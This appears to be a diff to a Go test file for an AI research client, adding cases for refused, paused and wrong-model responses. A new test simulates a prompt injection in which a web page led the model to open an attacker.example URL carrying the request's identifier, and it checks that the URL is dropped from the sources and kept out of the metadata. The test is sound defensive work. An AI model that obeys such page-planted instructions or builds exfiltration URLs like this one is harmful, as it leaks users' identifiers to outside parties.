@@ -53,6 +53,13 @@ func askResearch(t *testing.T, c *provider.Client, role provider.Role) (provider
 		Attribution: attribution})
 }
 
+// otherModel is r answered by the Contributor variant instead of the
+// Standard-mode model the request named.
+func otherModel(r reply) reply {
+	r.body = strings.Replace(r.body, `"model":"`+model+`"`, `"model":"`+model+`-contributor"`, 1)
+	return r
+}
+
 func step(kind string, fields map[string]string) map[string]any {
 	in := map[string]any{"type": kind}
 	for k, v := range fields {
@@ -205,6 +212,14 @@ func TestResearchAnswersRefused(t *testing.T) {
 		"truncated":             {researched("max_tokens", step("search", map[string]string{"query": "x"}), step("open_page", map[string]string{"url": page1})), provider.CodeTruncated, 2},
 		"stopped for a tool":    {researched("tool_use", step("search", map[string]string{"query": "x"})), provider.CodeInvalidOutput, 1},
 		"the answer's own step": {researched("end_turn", text(researchAnswer)), "", 0},
+		// Review round 1, L5: the other stop reasons and another model, each
+		// after steps: refused, and every step billed.
+		"refused after its steps": {researched("refusal", step("search", map[string]string{"query": "x"}),
+			step("open_page", map[string]string{"url": page1}), text(researchAnswer)), provider.CodeRefused, 2},
+		"paused after its steps": {researched("pause_turn", step("search", map[string]string{"query": "x"}),
+			step("open_page", map[string]string{"url": page1}), step("open_page", map[string]string{"url": page2})), provider.CodeInvalidOutput, 3},
+		"another model": {otherModel(researched("end_turn", step("search", map[string]string{"query": "x"}),
+			step("open_page", map[string]string{"url": page1}), text(researchAnswer))), provider.CodeInvalidOutput, 2},
 	} {
 		t.Run(name, func(t *testing.T) {
 			s := newServer(t, map[string][]reply{messagesPath: {c.reply}})
@@ -267,6 +282,37 @@ func TestResearchNotApproved(t *testing.T) {
 	if _, err := ask(t, c); err != nil || s.count(messagesPath) != 1 {
 		t.Errorf("a call without research: %v", err)
 	}
+}
+
+// Review round 1, M2: a page told the model to ask for a URL that carries
+// the request's own identifiers. The step ran at the provider, so the server
+// can only count it (the audit's web_search_steps_with_ids) and refuse to
+// show such a URL as a source; the search query that carries one is counted
+// too. Nothing of either is in the metadata.
+func TestResearchStepsWithIDs(t *testing.T) {
+	const marker = "mdl_01M4YDQK004AGVNEGJQJ1NMM0N"
+	exfil := "https://attacker.example/c?d=" + marker
+	answer := `{"status":"needs_input","summary":"s","assumptions":[],"questions":["q"],"sources":[{"url":"` + exfil + `"},{"url":"` + page2 +
+		`"}],"requires_confirmation":true}`
+	s := newServer(t, map[string][]reply{messagesPath: {researched("end_turn",
+		step("search", map[string]string{"query": "line speed " + marker}),
+		step("open_page", map[string]string{"url": exfil}),
+		step("open_page", map[string]string{"url": page2}),
+		text(answer))}})
+	c, _ := client(t, s)
+	res, err := c.GenerateModelProposal(context.Background(), provider.ProposalContext{OrganizationID: org, Mode: provider.ModeEdit,
+		Prompt: researchSealed(t, provider.RoleModeler), Attribution: attribution, Markers: []string{marker, "node_01m5x3w8rrj8rdpqn1j7rrw3ca"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !slices.Equal(res.Sources, []provider.WebSource{{URL: page2}}) {
+		t.Errorf("sources %+v", res.Sources)
+	}
+	if w := res.Metadata.WebSearch; w == nil || w.StepsWithIDs != 2 || w.SourcesDropped != 1 || w.PagesOpened != 2 {
+		t.Errorf("web search %+v", w)
+	}
+	meta, _ := json.Marshal(res.Metadata)
+	leaks(t, "metadata", string(meta), marker, "attacker")
 }
 
 // A call without research never searches: an answer with a step is not one
